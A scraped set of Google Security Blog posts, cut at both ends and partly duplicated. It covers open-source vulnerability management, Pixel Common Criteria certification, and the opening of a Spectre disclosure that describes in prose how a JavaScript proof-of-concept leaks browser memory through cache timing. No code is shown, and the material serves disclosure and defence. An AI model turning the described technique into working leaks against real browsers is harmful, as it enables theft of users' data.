forward to this discussion, to promoting the best ideas, and eventually to solutions that both strengthen and streamline the security of open source that we all depend on.       Notes                Ideally, depended-upon versions should be stable absent an explicit upgrade, but behavior varies depending on the packaging system. Two that aim for stability rather than fast upgrades are Go Modules and NuGet, both of which by default install upgrades only when the requirements are updated; the dependencies might be wrong, but they only  change  with explicit updates.&nbsp; &#8617;                                           Posted by Eric Brewer, Rob Pike, Abhishek Arya, Anne Bertucio and Kim Lewandowski   Executive Summary:   The security of open source software has rightfully garnered the industry’s attention, but solutions require consensus about the challenges and cooperation in the execution. The problem is complex and there are many facets to cover: supply chain, dependency management, identity, and build pipelines. Solutions come faster when the problem is well-framed; we propose a framework (“Know, Prevent, Fix”) for how the industry can think about vulnerabilities in open source and concrete areas to address first, including:    Consensus on metadata and identity standards: We need consensus on fundamentals to tackle these complex problems as an industry. Agreements on metadata details and identities will enable automation, reduce the effort required to update software, and minimize the impact of vulnerabilities.  Increased transparency and review for critical software: For software that is critical to security, we need to agree on development processes that ensure sufficient review, avoid unilateral changes, and transparently lead to well-defined, verifiable official versions.    The following framework and goals are proposed with the intention of sparking industry-wide discussion and progress on the security of open source software.           Due to recent events, the software world gained a deeper understanding about the real risk of supply-chain attacks. Open source software should be less risky on the security front, as all of the code and dependencies are in the open and available for inspection and verification. And while that is generally true, it assumes people are actually looking. With so many dependencies, it is impractical to monitor them all, and many open source packages are not well maintained.    It is common for a program to depend, directly or indirectly, on thousands of packages and libraries. For example, Kubernetes now depends on about 1,000 packages. Open source likely makes more use of dependencies than closed source, and from a wider range of suppliers; the number of distinct entities that need to be trusted can be very high. This makes it extremely difficult to understand how open source is used in products and what vulnerabilities might be relevant. There is also no assurance that what is built matches the source code.    Taking a step back, although supply-chain attacks are a risk, the vast majority of vulnerabilities are mundane and unintentional—honest errors made by well-intentioned developers. Furthermore, bad actors are more likely to exploit known vulnerabilities than to find their own: it’s just easier. As such, we must focus on making fundamental changes to address the majority of vulnerabilities, as doing so will move the entire industry far along in addressing the complex cases as well, including supply-chain attacks.   Few organizations can verify all of the packages they use, let alone all of the updates to those packages. In the current landscape, tracking these packages takes a non-trivial amount of infrastructure, and significant manual effort. At Google, we have those resources and go to extraordinary lengths to manage the open source packages we use—including keeping a private repo of all open source packages we use internally—and it is still challenging to track all of the updates. The sheer flow of updates is daunting. A core part of any solution will be more automation, and this will be a key theme for our open source security work in 2021 and beyond.    Because this is a complex problem that needs industry cooperation, our purpose here is to focus the conversation around concrete goals. Google co-founded the OpenSSF to be a focal point for this collaboration, but to make progress, we need participation across the industry, and agreement on what the problems are and how we might address them. To get the discussion started, we present one way to frame this problem, and a set of concrete goals that we hope will accelerate industry-wide solutions.   We suggest framing the challenge as three largely independent problem areas, each with concrete objectives:    Know about the vulnerabilities in your software  Prevent the addition of new vulnerabilities, and  Fix or remove vulnerabilities.    A related but separate problem, which is critical to securing the supply chain, is improving the security of the development process. We’ve outlined the challenges of this problem and proposed goals in the fourth section, Prevention for Critical Software.  Know your Vulnerabilities    Knowing your vulnerabilities is harder than expected for many reasons. Although there are mechanisms for reporting vulnerabilities, it is hard to know if they actually affect the specific versions of software you are using.    Goal: Precise Vulnerability Data   First, it is crucial to capture precise vulnerability metadata from all available data sources. For example, knowing which version introduced a vulnerability helps determine if one's software is affected, and knowing when it was fixed results in accurate and timely patching (and a reduced window for potential exploitation). Ideally, this triaging workflow should be automated.   Second, most vulnerabilities are in your dependencies, rather than the code you write or control directly. Thus, even when your code is not changing, there can be a constant churn in your vulnerabilities: some get fixed and others get added.1   Goal: Standard Schema for Vulnerability Databases   Infrastructure and industry standards are needed to track and maintain open source vulnerabilities, understand their consequences, and manage their mitigations. A standard vulnerability schema would allow common tools to work across multiple vulnerability databases and simplify the task of tracking, especially when vulnerabilities touch multiple languages or subsystems.   Goal: Accurate Tracking of Dependencies   Better tooling is needed to understand quickly what software is affected by a newly discovered vulnerability, a problem made harder by the scale and dynamic nature of large dependency trees. Current practices also often make it difficult to predict exactly what versions are used without actually doing an installation, as the software for version resolution is only available through the installer.  Prevent New Vulnerabilities    It would be ideal to prevent vulnerabilities from ever being created, and although testing and analysis tools can help, prevention will always be a hard problem. Here we focus on two specific aspects:    Understanding risks when deciding on a new dependency  Improving development processes for critical software    Goal: Understand the Risks for New Dependencies   The first category is essentially knowing about vulnerabilities at the time you decide to use a package. Taking on a new dependency has inherent risk and it needs to be an informed decision. Once you have a dependency, it generally becomes harder to remove over time.   Knowing about vulnerabilities is a great start, but there is more that we can do.   Many vulnerabilities arise from lack of adherence to security best practices in software development processes. Are all contributors using two-factor authentication (2FA)? Does the project have continuous integration set up and running tests? Is fuzzing integrated? These are the types of security checks that would help consumers understand the risks they’re taking on with new dependencies. Packages with a low “score” warrant a closer review, and a plan for remediation.   The recently announced Security Scorecards project from OpenSSF attempts to generate these data points in a fully automated way. Using scorecards can also help defend against prevalent typosquatting attacks (malevolent packages with names similar to popular packages), since they would score much lower and fail many security checks.   Improving the development processes for critical software is related to vulnerability prevention, but deserves its own discussion further down in our post.  Fix or Remove Vulnerabilities    The general problem of fixing vulnerabilities is beyond our scope, but there is much we can do for the specific problem of managing vulnerabilities in software dependencies. Today there is little help on this front, but as we improve precision it becomes worthwhile to invest in new processes and tooling.   One option of course is to fix the vulnerability directly. If you can do this in a backwards-compatible way, then the fix is available for everyone. But a challenge is that you are unlikely to have expertise on the problem, nor the direct ability to make changes. Fixing a vulnerability also assumes the software maintainers are aware of the issue, and have the knowledge and resources for vulnerability disclosure.       Conversely, if you simply remove the dependency that contains the vulnerability, then it is fixed for you and those that import or use your software, but not for anyone else. This is a change that is under your direct control.   These scenarios represent the two ends of the chain of dependencies between your software and the vulnerability, but in practice there can be many intervening packages. The general hope is that someone along that dependency chain will fix it. Unfortunately, fixing a link is not enough: Every link of the dependency chain between you and the vulnerability needs to be updated before your software will be fixed. Each link must include the fixed version of the thing below it to purge the vulnerability. Thus, the updates need to be done from the bottom up, unless you can eliminate the dependency altogether, which may require similar heroics and is rarely possible—but is the best solution when it is.    Goal: Understand your Options to Remove Vulnerabilities    Today, we lack clarity on this process: what progress has been made by others and what upgrades should be applied at what level? And where is the process stuck? Who is responsible for fixing the vulnerability itself? Who is responsible for propagating the fix?   Goal: Notifications to Speed Repairs   Eventually, your dependencies will be fixed and you can locally upgrade to the new versions. Knowing when this happens is an important goal as it accelerates reducing the exposure to vulnerabilities. We also need a notification system for the actual discovery of vulnerabilities; often new vulnerabilities represent latent problems that are newly discovered even though the actual code has not changed (such as this 10-year old vulnerability in the Unix utility sudo). For large projects, most such issues will arise in the indirect dependencies. Today, we lack the precision required to do notification well, but as we improve vulnerability precision and metadata (as above), we should also drive notification.    So far, we have only described the easy case: a sequence of upgrades that are all backwards compatible, implying that the behavior is the same except for the absence of the vulnerability.    In practice, an upgrade is often not backward compatible, or is blocked by restrictive version requirements. These issues mean that updating a package deep in the dependency tree must cause some churn, or at least requirement updates, in the things above it. The situation often arises when the fix is made to the latest version, say 1.3, but your software or intervening packages request 1.2. We see this situation often, and it remains a big challenge that is made even harder by the difficulty of getting owners to update intervening packages. Moreover, if you use a package in a thousand places, which is not crazy for a big enterprise, you might need to go through the update process a thousand times.   Goal: Fix the Widely Used Versions   It’s also important to fix the vulnerability in the older versions, especially those in heavy use. Such repair is common practice for the subset of software that has long-term support, but ideally all widely used versions should be fixed, especially for security risks.   Automation could help: given a fix for one version, perhaps we can generate good candidate fixes for other versions. This process is sometimes done by hand today, but if we can make it significantly easier, more versions will actually get patched, and there will be less work to do higher in the chain.   To summarize, we need ways to make fixing vulnerabilities, especially in dependencies, both easier and more timely. We need to increase the chance that there is a fix for widely used versions and not just for the latest version, which is often hard to adopt due to the other changes it includes.   Finally, there are many other options on the “fixing” front, including various kinds of mitigations, such as avoiding certain methods, or limiting risk through sandboxes or access controls. These are important practical options that need more discussion and support.  Prevention for Critical Software    The framing above applies broadly to vulnerabilities, regardless of whether they are due to bad actors or are merely innocent mistakes. Although the suggested goals cover most vulnerabilities, they are not sufficient to prevent malicious behavior. To have a meaningful impact on prevention for bad actors, including supply-chain attacks, we need to improve the processes used for development.   This is a big task, and currently unrealistic for the majority of open source. Part of the beauty of open source is its lack of constraints on the process, which encourages a wide range of contributors. However, that flexibility can hinder security considerations. We want contributors, but we cannot expect everyone to be equally focused on security. Instead, we must identify critical packages and protect them. Such critical packages must be held to a range of higher development standards, even though that might add developer friction.   Goal: Define Criteria for “Critical” Open Source Projects that Merit Higher Standards   It is important to identify the “critical” packages that we all depend upon and whose compromise would endanger critical infrastructure or user privacy. These packages need to be held to higher standards, some of which we outline below.    It is not obvious how to define “critical” and the definition will likely expand over time. Beyond obvious software, such as OpenSSL or key cryptographic libraries, there are widely used packages where their sheer reach makes them worth protecting. We started the Criticality Score project to brainstorm this problem with the community, as well collaborating with Harvard on the Open Source Census efforts.   Goal: No Unilateral Changes to Critical Software   One principle that we follow across Google is that changes should not be unilateral—that is, every change involves at least an author and a reviewer or approver. The goal is to limit what an adversary can do on their own—we need to make sure someone is actually looking at the changes. To do this well for open source is actually quite a bit harder than just within a single company, which can have strong authentication and enforce code reviews and other checks.   Avoiding unilateral changes can be broken down into two sub-goals:        Goal: Require Code Review for Critical Software        Besides being a great process for improving code, reviews ensure that at least one person other than the author is looking at every change. Code reviews are a standard practice for all changes within Google.        Goal: Changes to Critical Software Require Approval by Two Independent Parties        To really achieve the “someone is looking” goal, we need the reviewer to be independent from the contributor. And for critical changes, we probably want more than one independent review. We need to sort out what counts as “independent” review, of course, but the idea of independence is fundamental to reviews in most industries.     Goal: Authentication for Participants in Critical Software   Any notion of independence also implies that you know the actors—an anonymous actor cannot be assumed to be independent or trustworthy. Today, we essentially have pseudonyms: the same person uses an identity repeatedly and thus can have a reputation, but we don’t always know the individual’s trustworthiness. This leads to a range of subgoals:        Goal: For Critical Software, Owners and Maintainers Cannot be Anonymous        Attackers like to have anonymity. There have been past supply-chain attacks where attackers capitalized on anonymity and worked their way through package communities to become maintainers, without anyone realizing this “new maintainer” had malicious intent (compromising source code was eventually injected upstream). To mitigate this risk, our view is that owners and maintainers of critical software must not be anonymous.        It is conceivable that contributors, unlike owners and maintainers, could be anonymous, but only if their code has passed multiple reviews by trusted parties.         It is also conceivable that we could have “verified” identities, in which a trusted entity knows the real identity, but for privacy reasons the public does not. This would enable decisions about independence as well as prosecution for illegal behavior.        Goal: Strong Authentication for Contributors of Critical Software        Malicious actors look for easy attack vectors, so phishing attacks and other forms of theft related to credentials are common. One obvious improvement would be the required use of two-factor authentication, especially for owners and maintainers.         Goal: A Federated Model for Identities        To continue the inclusive nature of open source, we need to be able to trust a wide range of identities, but still with verified integrity. This implies a federated model for identities, perhaps similar to how we support federated SSL certificates today—a range of groups can generate valid certificates, but with strong auditing and mutual oversight.    Discussions on this topic are starting to take place in the OpenSSF’s Digital Identity Attestation Working Group.   Goal: Notification for Changes in Risk   We should extend notifications to cover changes in risk. The most obvious is ownership changes, which can be a prelude to new attacks (such as the recent NPM event-stream compromise). Other examples include discovery of stolen credentials, collusion, or other bad actor behavior.   Goal: Transparency for Artifacts   It is common to use secure hashes to detect if an artifact has arrived intact, and digital signatures to prove authenticity. Adding “transparency” means that these attestations are logged publicly and thus document what was intended. In turn, external parties can monitor the logs for fake versions even if users are unaware. Going a step further, when credentials are stolen, we can know what artifacts were signed using those credentials and work to remove them. This kind of transparency, including the durable public logs and the third-party monitoring, has been used to great success for SSL certificates, and we have proposed one way to do this for package managers. Knowing you have the right package or binary is similar to knowing you are visiting the real version of a web site.   Goal: Trust the Build Process   Ken Thompson's Turing Award lecture famously demonstrated in 1984 that authentic source code alone is not enough, and recent events have shown this attack is a real threat. How do you trust your build system? All the components of it must be trusted and verified through a continuous process of building trust.   Reproducible builds help—there is a deterministic outcome for the build and we can thus verify that we got it right—but are harder to achieve due to ephemeral data (such as timestamps) ending up in the release artifact. And safe reproducible builds require verification tools, which in turn must be built verifiably and reproducibly, and so on. We must construct a network of trusted tools and build products.   Trust in both the artifacts and the tools can be established via “delegation”, through a variant of the transparency process described above called binary authorization. Internally, the Google build system signs all artifacts and produces a manifest that ties it to the source code. For open source, one or more trusted agents could run the build as a service, signing the artifact to prove that they are accountable for its integrity. This kind of ecosystem should exist and mostly needs awareness and some agreements on the format of attestations, so that we can automate the processes securely.   The actions in this section are great for software in general, and are essentially in use today within Google, but they are heavier weight than usual for open source. Our hope is that by focusing on the subset of software that is critical, we can achieve these goals at least for that set. As the tooling and automation get better, these goals will become easier to adopt more widely.  Summary    The nature of open source requires that we solve problems through consensus and collaboration. For complex topics such as vulnerabilities, this implies focused discussion around the key issues. We presented one way to frame this discussion, and defined a set of goals that we hope will accelerate industry-wide discourse and the ultimate solutions. The first set of goals apply broadly to vulnerabilities and are really about enabling automation and reducing risk and toil.  However, these goals are not enough in the presence of adversaries or to prevent “supply chain” attacks. Thus we propose a second set of goals for critical software. The second set is more onerous and therefore will meet some resistance, but we believe the extra constraints are fundamental for security. The intention is to define collectively the set of “critical” software packages, and apply these higher standards only to this set.Although we have various opinions on how to meet both sets of goals, we are but one voice in a space where consensus and sustainable solutions matter most of all. We look forward to this discussion, to promoting the best ideas, and eventually to solutions that both strengthen and streamline the security of open source that we all depend on.    Notes          Ideally, depended-upon versions should be stable absent an explicit upgrade, but behavior varies depending on the packaging system. Two that aim for stability rather than fast upgrades are Go Modules and NuGet, both of which by default install upgrades only when the requirements are updated; the dependencies might be wrong, but they only change with explicit updates. ↩       ", "date": "February 3, 2021"},
{"website": "Google-Security", "title": "\n Continuing to Raise the Bar for Verifiable Security on Pixel\n", "author": ["Posted by Eugene Liderman, Android Security and Privacy Team"], "link": "https://security.googleblog.com/2021/03/continuing-to-raise-bar-for-verifiable.html", "abstract": "                                   Posted by Eugene Liderman, Android Security and Privacy Team    Evaluating the security of mobile devices is difficult, and a trusted way to validate a company&#8217;s claims is through independent, industry certifications. When it comes to smartphones one of the most rigorous end-to-end certifications is the  Common Criteria (CC) Mobile Device Fundamentals (MDF) Protection Profile .  Common Criteria  is the driving force for establishing widespread mutual recognition of secure IT products across 31 countries . Over the past few years only three smartphone manufacturers have continually been certified on every OS version: Google, Samsung, and Apple. At the beginning of February, we successfully completed this certification for all currently supported  Pixel smartphones running Android 11 . Google is the first manufacturer to be certified on the latest OS version.     This specific certification is designed to evaluate how a device defends against the real-world threats facing both consumers and businesses. The table below outlines the threats and mitigations provided in the CC MDF protection profile:               Threats        Mitigations         Network Eavesdropping   -  An attacker is positioned on a wireless communications channel or elsewhere on the network infrastructure   Network Attack -  An attacker is positioned on a wireless communications channel or elsewhere on the network infrastructure      Protected Communications -  Standard protocols such as IPsec, DTLS, TLS, HTTPS, and Bluetooth to ensure encrypted communications are secure   Authorization and Authentication -  Secure authentication for networks and backends   Mobile Device Configuration  - Capabilities for configuring and applying security policies defined by the user and/or Enterprise Administrator         Physical Access -  An attacker, with physical access, may attempt to retrieve user data on the mobile device, including credentials      Protected Storage    -  Secure storage (that is, encryption of data-at-rest) for data contained on the device&nbsp;    Authorization and Authentication -   Secure device authentication using a known unlock factor, such as a password, PIN, fingerprint, or face authentication           Malicious or Flawed Application -  Applications loaded onto the Mobile Device may include malicious or exploitable code&nbsp;     Protected Communications -  Standard protocols such as IPsec, DTLS, TLS, HTTPS, and Bluetooth to ensure encrypted communications are secure    Authorization and Authentication -  Secure authentication for networks and backends    Mobile Device Configuration -  Capabilities for configuring and applying security policies defined by the user and/or Enterprise Administrator    Mobile Device Integrity -  Device integrity for critical functionality of both software and hardware     End User Privacy and Device Functionality -  Application isolation/sandboxing and framework permissions provide separation and privacy between user activities          Persistent Presence -  Persistent presence on a device by an attacker implies that the device has lost integrity and cannot regain it&nbsp;     Mobile Device Integrity -  Device integrity to ensure the integrity of critical functionality of both software and hardware is maintained     End User Privacy and Device Functionality -  Application isolation/sandboxing and framework permissions provide separation and privacy between user activities           What makes this certification important is the fact that it is a hands on evaluation done by an  authorized lab to evaluate the device and perform a variety of tests to ensure that:       Every mitigation meets a predefined standard and set of criteria.    Every mitigation works as advertised.       At a high level, the target of evaluation (TOE) is the combination of device hardware (i.e. system on chip) and operating system (i.e. Android). In order to validate our mitigations for the threats listed above, the lab looks at the following security functionality:        Protected Communications (encryption of data-in-transit)  - Cryptographic algorithms and transport protocols used to encrypt the Wi-Fi traffic and all other network operations and communications.      Protected Storage (encryption of data-at-rest)  - Cryptography provided by the system on chip, trusted execution environment, and any other discrete tamper resistant hardware such as the  Titan M  and the Android OS. Specifically looking at things like implementation of  file-based encryption , hardware root of trust,  keystore operations  (such as, key generation), key storage, key destruction, and key hierarchy.     Authorization and Authentication  -  Mechanisms for  unlocking the user&#8217;s devices , such as password, PIN or  Biometric . Mitigation techniques like rate limiting and for biometrics,  False Acceptance and Spoof Acceptance Rates .     Mobile Device Integrity  - Android&#8217;s implementation of  Verified Boot ,  Google Play System Updates , and  Seamless OS Updates .     Auditability  - Features that allow a user or IT admin to  log events  such as device start-up and shutdown, data encryption, data decryption, and key management.       Mobile Device Configuration  - Capabilities that allow the user or enterprise admin to apply security policies to the device  using Android Enterprise .        Why this is important for enterprises       It&#8217;s incredibly important to ensure Pixel security can specifically support enterprise needs. Many regulated industries require the use of Common Criteria certified devices to ensure that sensitive data is backed by the strongest possible protections. The Android Enterprise management framework enables enterprises to do things like control devices by setting restrictions around what the end user can do and audit devices to ensure all software settings are configured properly. For example, enterprise IT admins wish to enforce policies for features like the camera, location services or app installation process.      Why this is important for consumers       Security isn&#8217;t just an enterprise concern and many of the protections validated by Common Criteria certification apply to consumers as well. For example, when you&#8217;re connecting to Wi-Fi, you want to ensure no one can spy on your web browsing. If your device is lost or stolen, you want to be confident that your lock screen can reduce the chances of someone accessing your personal information.      We believe in making security &amp; privacy accessible to all of our users. This is why we  take care to ensure that Pixel devices meet or exceed these certification standards.. We&#8217;re committed to meeting these standards moving forward, so you can rest assured that your Pixel phone comes with top-of-the-line security built in, from the moment you turn it on.     Why this is important to the Android Ecosystem       While certifications are a great form of third party validation, they often fall under what we like to call the 3 C&#8217;s:        Complex -  Due to the scope of the evaluation including the device hardware, the operating system and everything in between.     Costly  - Because they require a hands on evaluation by a certified lab for every make/model combination (SoC + OS) which equates to  hundreds of individual tests .      Cumbersome  - Because it&#8217;s a fairly lengthy evaluation process that can take upwards of 18 months the first time you go through it.       We have been working these last three years to reduce this complexity for our OEM partners. We are excited to tell you that the features required to satisfy the necessary security requirements are baked directly into the Android Open Source Project. We&#8217;ve also added all of the management and auditability requirements into the Android Enterprise Management framework. Last year we started publishing the tools we have developed for this on  GitHub  to allow other Android OEMs to take advantage of our efforts as they go through their certification.     While we continue certifying Pixel smartphones with new Android OS versions, we have worked to enable other Android OEMs to achieve this certification as well as others, such as:        National Institute of Technology&#8217;s   Cryptographic Algorithm  and  Module Validation Programs   which is an evaluation of the cryptographic algorithms and/or modules and is something the US Public Sector and numerous other regulated verticals look for. With Android 11, BoringSSL which is part of the conscrypt mainline module has completed this validation ( Certificate #3753 )     US Department of Defense's Security Technical Implementation Guide ; STIG for short is a guideline for how to deploy technology on a US Department of Defense network. In the past there were different STIGs for different Android OEMs which had their own implementations and proprietary controls, but thanks to our efforts we are now unifying this under a single Android STIG template so that Android OEMs don&#8217;t have to go through the burden of building custom controls to satisfy the various requirements.       We&#8217;ll continue to invest in additional ways to measure security for both enterprises and consumers, and we welcome the industry to join us in this effort.                                       Posted by Eugene Liderman, Android Security and Privacy Team  Evaluating the security of mobile devices is difficult, and a trusted way to validate a company’s claims is through independent, industry certifications. When it comes to smartphones one of the most rigorous end-to-end certifications is the Common Criteria (CC) Mobile Device Fundamentals (MDF) Protection Profile. Common Criteria is the driving force for establishing widespread mutual recognition of secure IT products across 31 countries . Over the past few years only three smartphone manufacturers have continually been certified on every OS version: Google, Samsung, and Apple. At the beginning of February, we successfully completed this certification for all currently supported Pixel smartphones running Android 11. Google is the first manufacturer to be certified on the latest OS version.   This specific certification is designed to evaluate how a device defends against the real-world threats facing both consumers and businesses. The table below outlines the threats and mitigations provided in the CC MDF protection profile:ThreatsMitigationsNetwork Eavesdropping - An attacker is positioned on a wireless communications channel or elsewhere on the network infrastructureNetwork Attack - An attacker is positioned on a wireless communications channel or elsewhere on the network infrastructure Protected Communications - Standard protocols such as IPsec, DTLS, TLS, HTTPS, and Bluetooth to ensure encrypted communications are secureAuthorization and Authentication - Secure authentication for networks and backendsMobile Device Configuration - Capabilities for configuring and applying security policies defined by the user and/or Enterprise AdministratorPhysical Access - An attacker, with physical access, may attempt to retrieve user data on the mobile device, including credentials Protected Storage - Secure storage (that is, encryption of data-at-rest) for data contained on the device Authorization and Authentication - Secure device authentication using a known unlock factor, such as a password, PIN, fingerprint, or face authenticationMalicious or Flawed Application - Applications loaded onto the Mobile Device may include malicious or exploitable code Protected Communications - Standard protocols such as IPsec, DTLS, TLS, HTTPS, and Bluetooth to ensure encrypted communications are secure Authorization and Authentication - Secure authentication for networks and backends Mobile Device Configuration - Capabilities for configuring and applying security policies defined by the user and/or Enterprise Administrator Mobile Device Integrity - Device integrity for critical functionality of both software and hardware End User Privacy and Device Functionality - Application isolation/sandboxing and framework permissions provide separation and privacy between user activitiesPersistent Presence - Persistent presence on a device by an attacker implies that the device has lost integrity and cannot regain it Mobile Device Integrity - Device integrity to ensure the integrity of critical functionality of both software and hardware is maintained End User Privacy and Device Functionality - Application isolation/sandboxing and framework permissions provide separation and privacy between user activities  What makes this certification important is the fact that it is a hands on evaluation done by an  authorized lab to evaluate the device and perform a variety of tests to ensure that:    Every mitigation meets a predefined standard and set of criteria.  Every mitigation works as advertised.    At a high level, the target of evaluation (TOE) is the combination of device hardware (i.e. system on chip) and operating system (i.e. Android). In order to validate our mitigations for the threats listed above, the lab looks at the following security functionality:    Protected Communications (encryption of data-in-transit) - Cryptographic algorithms and transport protocols used to encrypt the Wi-Fi traffic and all other network operations and communications.   Protected Storage (encryption of data-at-rest) - Cryptography provided by the system on chip, trusted execution environment, and any other discrete tamper resistant hardware such as the Titan M and the Android OS. Specifically looking at things like implementation of file-based encryption, hardware root of trust, keystore operations (such as, key generation), key storage, key destruction, and key hierarchy.  Authorization and Authentication -  Mechanisms for unlocking the user’s devices, such as password, PIN or Biometric. Mitigation techniques like rate limiting and for biometrics, False Acceptance and Spoof Acceptance Rates.  Mobile Device Integrity - Android’s implementation of Verified Boot, Google Play System Updates, and Seamless OS Updates.  Auditability - Features that allow a user or IT admin to log events such as device start-up and shutdown, data encryption, data decryption, and key management.    Mobile Device Configuration - Capabilities that allow the user or enterprise admin to apply security policies to the device using Android Enterprise.    Why this is important for enterprises    It’s incredibly important to ensure Pixel security can specifically support enterprise needs. Many regulated industries require the use of Common Criteria certified devices to ensure that sensitive data is backed by the strongest possible protections. The Android Enterprise management framework enables enterprises to do things like control devices by setting restrictions around what the end user can do and audit devices to ensure all software settings are configured properly. For example, enterprise IT admins wish to enforce policies for features like the camera, location services or app installation process.   Why this is important for consumers    Security isn’t just an enterprise concern and many of the protections validated by Common Criteria certification apply to consumers as well. For example, when you’re connecting to Wi-Fi, you want to ensure no one can spy on your web browsing. If your device is lost or stolen, you want to be confident that your lock screen can reduce the chances of someone accessing your personal information.    We believe in making security & privacy accessible to all of our users. This is why we  take care to ensure that Pixel devices meet or exceed these certification standards.. We’re committed to meeting these standards moving forward, so you can rest assured that your Pixel phone comes with top-of-the-line security built in, from the moment you turn it on.  Why this is important to the Android Ecosystem    While certifications are a great form of third party validation, they often fall under what we like to call the 3 C’s:    Complex - Due to the scope of the evaluation including the device hardware, the operating system and everything in between.  Costly - Because they require a hands on evaluation by a certified lab for every make/model combination (SoC + OS) which equates to hundreds of individual tests.   Cumbersome - Because it’s a fairly lengthy evaluation process that can take upwards of 18 months the first time you go through it.    We have been working these last three years to reduce this complexity for our OEM partners. We are excited to tell you that the features required to satisfy the necessary security requirements are baked directly into the Android Open Source Project. We’ve also added all of the management and auditability requirements into the Android Enterprise Management framework. Last year we started publishing the tools we have developed for this on GitHub to allow other Android OEMs to take advantage of our efforts as they go through their certification.   While we continue certifying Pixel smartphones with new Android OS versions, we have worked to enable other Android OEMs to achieve this certification as well as others, such as:    National Institute of Technology’s Cryptographic Algorithm and Module Validation Programs  which is an evaluation of the cryptographic algorithms and/or modules and is something the US Public Sector and numerous other regulated verticals look for. With Android 11, BoringSSL which is part of the conscrypt mainline module has completed this validation (Certificate #3753)  US Department of Defense's Security Technical Implementation Guide; STIG for short is a guideline for how to deploy technology on a US Department of Defense network. In the past there were different STIGs for different Android OEMs which had their own implementations and proprietary controls, but thanks to our efforts we are now unifying this under a single Android STIG template so that Android OEMs don’t have to go through the burden of building custom controls to satisfy the various requirements.    We’ll continue to invest in additional ways to measure security for both enterprises and consumers, and we welcome the industry to join us in this effort.      ", "date": "March 11, 2021"},
{"website": "Google-Security", "title": "\n A Spectre proof-of-concept for a Spectre-proof web \n", "author": [], "link": "https://security.googleblog.com/2021/03/a-spectre-proof-of-concept-for-spectre.html", "abstract": "                               Posted by Stephen Röttger and Artur Janc, Information Security Engineers     Three years ago,    Spectre    changed the way we think about security boundaries on the web. It quickly became clear that    flaws in modern processors    undermined the guarantees that web browsers could make about preventing data leaks between applications. As a result, web browser vendors have been continuously collaborating on approaches intended to harden the platform at scale. Nevertheless, this class of attacks still remains a concern and requires web developers to deploy    application-level mitigations   .     In this post, we will share the results of Google Security Team's research on the exploitability of Spectre against web users, and present a fast, versatile proof-of-concept (PoC) written in JavaScript which can leak information from the browser's memory. We've confirmed that this proof-of-concept, or its variants, function across a variety of operating systems, processor architectures, and hardware generations.     By sharing our findings with the security community, we aim to give web application owners a better understanding of the impact Spectre vulnerabilities can have on the security of their users' data. Finally, this post describes the protections available to web authors and best practices for enabling them in web applications, based on our experience across Google.           A bit of background         The    Spectre    vulnerability,    disclosed    to the public in January 2018, makes use of a class of processor (CPU) design vulnerabilities that allow an attacker to change the intended program control flow while the CPU is speculatively executing subsequent instructions. For example, the CPU may speculate that a length check passes, while in practice it will access out-of-bounds memory. While the CPU state is rolled back once the misprediction is noticed, this behavior leaves observable side effects which can leak data to an attacker.     In 2019, the team responsible for V8, Chrome&#8217;s JavaScript engine, published a    blog post    and    whitepaper    concluding that such attacks    can&#8217;t be reliably mitigated    at the software level. Instead, robust solutions to these issues require security boundaries in applications such as web browsers to be aligned with low-level primitives, for example    process-based isolation   .&nbsp;     In parallel, browser vendors and standards bodies developed security mechanisms to protect web users from these classes of attacks. This included both architectural changes which offer default protections enabled in some browser configurations (such as    Site Isolation   ,    out-of-process iframes   , and    Cross-Origin Read Blocking   ), as well as broadly applicable opt-in security features that web developers can deploy in their applications:    Cross-Origin Resource Policy   ,    Cross-Origin Opener Policy   ,    Cross-Origin Embedder Policy   , and others.     These mechanisms, while crucially important, don't prevent the exploitation of Spectre; rather, they protect sensitive data from being present in parts of the memory from which they can be read by the attacker. To evaluate the robustness of these defenses, it's therefore important to develop security tools that help security engineers understand the practical implications of speculative execution attacks for their applications.           Demonstrating Spectre in a web browser         Today, we&#8217;re sharing proof-of-concept (PoC) code that confirms the practicality of Spectre exploits against JavaScript engines. We use Google Chrome to demonstrate our attack, but these issues are not specific to Chrome, and we expect that other modern browsers are similarly vulnerable to this exploitation vector. We have developed an interactive demonstration of the attack available at    https://leaky.page/   ; the code and a more detailed writeup are published on Github    here   .               The demonstration website can leak data at a speed of 1kB/s when running on Chrome 88 on an Intel Skylake CPU. Note that the code will likely require minor modifications to apply to other CPUs or browser versions; however, in our tests the attack was successful on several other processors, including the Apple M1 ARM CPU, without any major changes.           While experimenting, we also developed other PoCs with different properties. Some examples include:      A PoC which can leak 8kB/s of data at a cost of reduced stability using    performance.now()    as a timer with 5μs precision.      A PoC which leaks data at 60B/s using timers with a precision of 1ms or worse.             We chose to release the current PoC since it has a negligible setup time and works in the absence of high precision timers, such as   SharedArrayBuffer  .     The main building blocks of the PoC are:      A Spectre   gadget  : code that triggers attacker-controlled transient execution.      A   side-channel  : a way to observe side effects of the transient execution.             1. The gadget    For the published PoC, we implemented a simple    Variant 1    gadget: a JavaScript array is speculatively accessed out of bounds after training the branch predictor that the compiler-inserted length check will succeed. This particular gadget can be mitigated at the software level; however, Chrome's V8 team    concluded    that this is not the case for other gadgets: &#8220;  we found that effective mitigation of some variants of Spectre, particularly variant 4, to be simply infeasible in software.  &#8221;     We invite the security community to extend our research and develop code that makes use of other Spectre gadgets.           2. The side-channel    A common way to leak secret data via speculative execution is to use a cache    side-channel   . By observing if a certain memory location is present in the cache or not, we can infer if it has been accessed during the speculative execution. The challenge in JavaScript is to find a high resolution timer allowing to distinguish cache from memory accesses, as modern browsers have reduced the timer granularity of the    performance.now()    API and disabled    SharedArrayBuffers    in contexts without cross-origin isolation to prevent timing attacks.     Already in 2018, the V8 team shared their    observation    that reduced timer granularity is not sufficient to mitigate Spectre, since attackers can arbitrarily amplify timing differences. The presented amplification technique was based on reading secret data multiple times which can, however, reduce the effectiveness of the attack if the information leak is probabilistic.     In our PoC, we developed a new technique that overcomes this limitation. By abusing the behavior of the    Tree-PLRU    cache eviction strategy commonly found in modern CPUs, we were able to significantly amplify the cache timing with a single read of secret data. This allowed us to leak data efficiently even with low precision timers. For technical details, see the demonstration at    https://leaky.page/plru.html   .     While we don't believe this particular PoC can be re-used for nefarious purposes without significant modifications, it serves as a compelling demonstration of the risks of Spectre. In particular, we hope it provides a clear signal for web application developers that they need to consider this risk in their security evaluations and take active steps to protect their sites.           Deploying web defenses against Spectre         The low-level nature of speculative execution vulnerabilities makes them    difficult    to fix comprehensively, as a proper patch can require changes to the firmware or hardware on the user's device. While operating system and web browser developers have implemented important built-in protections where possible (including    Site Isolation    with    out-of-process iframes    and    Cross-Origin 